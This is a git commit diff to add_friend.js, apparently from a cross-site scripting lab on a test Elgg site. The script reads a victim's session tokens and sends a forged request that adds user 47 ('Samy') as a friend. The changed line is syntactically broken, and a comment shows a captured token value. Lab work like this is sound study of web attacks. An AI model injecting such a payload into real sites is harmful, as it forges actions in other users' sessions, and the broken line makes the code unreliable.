023d12cb7b60ce8faecbbde7fac070751f6623f4
Abdullah Elsayed <abdallah.elsaid25@gmail.com>
2025-01-01 22:36:23 +0200

    Fix friend addiation

--- add_friend.js
+++ add_friend.js
@@ -4,7 +4,8 @@ var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 var token="&__elgg_token="+elgg.security.token.__elgg_token;
 
 //Construct the HTTP request to add Samy as a friend.
-var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=" + ts + "&__elgg_token=" + token + "&__elgg_ts=" + ts + "&__elgg_token=" + token + ";" 
+//http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1735760964&__elgg_token=DUjeoRZfi6oEQeYM96fLHA&__elgg_ts=1735760964&__elgg_token=DUjeoRZfi6oEQeYM96fLHA
+var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" = ts + token + ts + token;
 
 //Create and send Ajax request to add friend
 Ajax=new XMLHttpRequest();
